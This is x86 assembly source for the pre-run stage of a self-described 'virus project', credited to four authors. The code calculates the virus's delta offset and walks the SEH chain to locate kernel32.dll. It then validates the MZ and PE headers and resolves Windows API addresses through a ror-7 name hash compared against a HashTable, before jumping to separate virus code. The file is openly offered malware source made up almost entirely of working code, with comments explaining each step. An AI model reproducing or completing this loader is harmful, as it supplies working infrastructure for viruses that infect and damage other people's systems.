;-----------------------------------------------------------------------------------------
;Authors: Maslov Mikhail, Sokolov Igor, Bolotin Petr, Kaloshin Pavel.
;-----------------------------------------------------------------------------------------
 
;-----------------------------------------------------------------------------------------
; This piece of code contains some pre-run functions for virus project.
;-----------------------------------------------------------------------------------------  
 
;-----------------------------------------------------------------------------------------
    call    VirDelta	; Running function VirDelta
;-----------------------------------------------------------------------------------------
; This function calculates delta ofset of our virus code.
;-----------------------------------------------------------------------------------------
VirDelta:								  ; [FUNCTION - VirDelta]
    sub  dword ptr [esp], OFFSET VirDelta ; Counting delta offset.
    push dword ptr [esp]                  ; Pushing to stack.
;-----------------------------------------------------------------------------------------
; This function reads Structure Exceptions. We use it as a debugging function.
;-----------------------------------------------------------------------------------------
_ReadSEH:								  ; [FUNCTION - ReadSEH]
    xor    edx, edx                       ; Making edx value NULL.
    assume fs:flat                        ; Setting all segment registers to flat
										  ; memory model.
    mov    eax, fs:[edx]                  ; Reading element of Structure Exception
	                                      ; Handling (SEH).
    dec    edx                            ; Making edx value = 0FFFFFFFFH.
;-----------------------------------------------------------------------------------------
; This function is looking for SEH value in kernel32.dll. To get some exe's to attack.
;-----------------------------------------------------------------------------------------
_SearchK32:                               ; [FUNCTION - SearchK32]
    cmp    [eax], edx                     ; Looking for SEH we require.
    je     _CheckK32                      ; If equal jump to CheckK32.
    mov    eax, [eax]                     ; Than getting next value.
    jmp    _SearchK32                     ; Jumping back to SearchK32.
;-----------------------------------------------------------------------------------------
; This function gets an adress in kernel32.dll to attack.
;-----------------------------------------------------------------------------------------
_CheckK32:                                ; [FUNCTION - CheckK32]
    mov    eax, [eax + 4]                 ; Getting adress somewhere in kernel32.dll.
    xor    ax, ax                         ; Making it suiatable to operate with.
;-----------------------------------------------------------------------------------------
; This function searches for MZ-signature. The part of PE-file.
;-----------------------------------------------------------------------------------------
_SearchMZ:                                ; [FUNCTION - SearchMZ]
    cmp word ptr [eax], 5A4Dh             ; Comparing header signature.
    je  _CheckMZ                          ; If equal than jump to CheckMZ.
    sub eax, 10000h                       ; If not equal than 
    jmp _SearchMZ                         ; jump and search again.
;-----------------------------------------------------------------------------------------
; This function checkes if PE-header has MZ-signature.
;-----------------------------------------------------------------------------------------
_CheckMZ:	                              ; [FUNCTION - CheckMZ]
    mov  edx, [eax + 3Ch]                 ; Moving to PE-header.
    cmp  word ptr [eax + edx], 4550h      ; Checking signature.
    jne  _Exit                            ; If not equal - than Exit. If equal going
	                                      ; ahead.
;-----------------------------------------------------------------------------------------	
; This function begins to scan not for function name, but for function hash in HashTable.
; PE-header stores API name in Export Table RVA (+78h from beginning).
;-----------------------------------------------------------------------------------------
_SearchAPI:                               ; [FUNCTION - SearchAPI]
    mov   esi, [eax + edx + 78h]          ; Giving esi adress.
    add   esi, eax                        ; We need not RVA, but VA that's why we add 
    add   esi, 18h                        ; image base (adress to where file is projected
    xchg  eax, ebx                        ; by Windows).
	                                      ; xchg means eXCHanGe, lol!
    lodsd                                 ; HERE we finally get pointer to Export RVA 
	                                      ; Table.
    push  eax                             ; [ebp+4*4]
    lodsd                                 ; Get RVA export Adress Table (+1Ch).
    push  eax                             ; [ebp+4*3]
    lodsd                                 ; Get RVA of Table of Name Pointers (+20h).
    push  eax                             ; [ebp+4*2]
    add   eax, ebx                        ; VA, not RVA!
    push  eax                             ; Pointer to name table. [ebp+4*1]
    lodsd                                 ; Get RVA of Ordinal Table (+24h).
    push  eax                             ; [ebp]
    mov   edi, [esp+4*5]                  ; Set edi equal to delta offset.
    lea   edi, [edi+HashTable]            ; edi shows beginning of HashTable.
    mov   ebp, esp                        ; Saving stack base.
;-----------------------------------------------------------------------------------------
; This function begins to search for function hash.
;-----------------------------------------------------------------------------------------
_BeginSearch:                             ; [FUNCTION - BeginSearch]
    mov   ecx, [ebp+4*4]                  ; Number of function names.
    xor   edx, edx                        ; Sequence number of function.
;-----------------------------------------------------------------------------------------
; This function searches for ASCII name of function API.
;-----------------------------------------------------------------------------------------
_SearchAPIName:                           ; [FUNCTION - SearchAPIName]
    mov  esi, [ebp+4*1]                   ;
    mov  esi, [esi]                       ;
    add  esi, ebx                         ; 
;-----------------------------------------------------------------------------------------
; This function can get hash-name of function.
;-----------------------------------------------------------------------------------------
_GetHash:                                 ; [FUNCTION - GetHash]
    xor  eax, eax                         ; Making eax NULL.
    push eax                              ; Pushing to stack.
;-----------------------------------------------------------------------------------------
_CalcHash:                                ; [FUNCTION - CalcHash]
    ror  eax,7                            ;
    xor  [esp],eax                        ;
    lodsb                                 ;
    test al, al                           ;
    jnz  _CalcHash                        ;
    pop  eax                              ;
;-----------------------------------------------------------------------------------------
; Function that checks if function hash represents to real hash of function from HashTable.
;-----------------------------------------------------------------------------------------
OkHash:								;[FUNCTION - OkHash]
    cmp  eax, [edi]                 ; Comparing our hash with hash from HashTable.
    je   _OkAPI                     ; If equal than jump to OkAPI function.
    add  dword ptr [ebp+4*1], 4     ; Going to the next element of export table.
    inc  edx						;
    loop _SearchAPIName 			; Call SearchAPIName and start hash check again.
    jmp  _Exit                      ; Then we go off.       
;-----------------------------------------------------------------------------------------
; Calculating function API-adress.
;-----------------------------------------------------------------------------------------
_OkAPI:								;[FUNCTION - OkAPI]
    shl  edx, 1                     ; Function number.
    mov  ecx, [ebp]                 ; Ordinal Table Pointer.
    add  ecx, ebx                   ;
    add  ecx, edx                   ;
    mov  ecx, [ecx]                 ;
    and  ecx, 0FFFFh                ;
    mov  edx, [ebp+4*3]             ; Getting RVA of Export Table.
    add  edx, ebx                   ;
    shl  ecx, 2                     ;
    add  edx, ecx                   ;
    mov  edx, [edx]                 ;
    add  edx, ebx                   ;
    push edx                        ; Saving address of function we've found in stack.
    cmp  word ptr [edi+4], 0FFFFh   ; Is it end of list&
    je   VirusCode					; If yes, than jump to VirusCode label.
									; (This func is stored in virus_code.asm)
    add  edi, 4                     ; Next function Hash-value.
;-----------------------------------------------------------------------------------------
; This function calculates next function's name.
;-----------------------------------------------------------------------------------------
_NextName:							; [FUNCTION - NextName]
    mov  ecx, [ebp+4*2]             ; Recovering the beginning of export table;
    add  ecx, ebx                   ;
    mov  [ebp+4*1], ecx             ; Index in the table of names.
    jmp  short _BeginSearch			; Jumping to function BeginSearch.